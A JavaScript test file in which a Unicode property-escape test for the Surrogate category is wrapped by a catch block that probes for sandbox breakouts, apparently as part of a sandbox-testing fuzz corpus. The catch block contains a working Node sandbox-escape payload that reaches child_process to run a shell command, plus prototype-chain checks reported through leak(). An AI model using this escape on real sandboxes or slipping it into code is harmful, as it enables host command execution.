try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                55296,
                56319
            ]
        ]
    });
    testPropertyEscapes(/^\p{General_Category=Surrogate}+$/u, matchSymbols, '\\p{General_Category=Surrogate}');
    testPropertyEscapes(/^\p{General_Category=Cs}+$/u, matchSymbols, '\\p{General_Category=Cs}');
    testPropertyEscapes(/^\p{gc=Surrogate}+$/u, matchSymbols, '\\p{gc=Surrogate}');
    testPropertyEscapes(/^\p{gc=Cs}+$/u, matchSymbols, '\\p{gc=Cs}');
    testPropertyEscapes(/^\p{Surrogate}+$/u, matchSymbols, '\\p{Surrogate}');
    testPropertyEscapes(/^\p{Cs}+$/u, matchSymbols, '\\p{Cs}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                0,
                55295
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{General_Category=Surrogate}+$/u, nonMatchSymbols, '\\P{General_Category=Surrogate}');
    testPropertyEscapes(/^\P{General_Category=Cs}+$/u, nonMatchSymbols, '\\P{General_Category=Cs}');
    testPropertyEscapes(/^\P{gc=Surrogate}+$/u, nonMatchSymbols, '\\P{gc=Surrogate}');
    testPropertyEscapes(/^\P{gc=Cs}+$/u, nonMatchSymbols, '\\P{gc=Cs}');
    testPropertyEscapes(/^\P{Surrogate}+$/u, nonMatchSymbols, '\\P{Surrogate}');
    testPropertyEscapes(/^\P{Cs}+$/u, nonMatchSymbols, '\\P{Cs}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}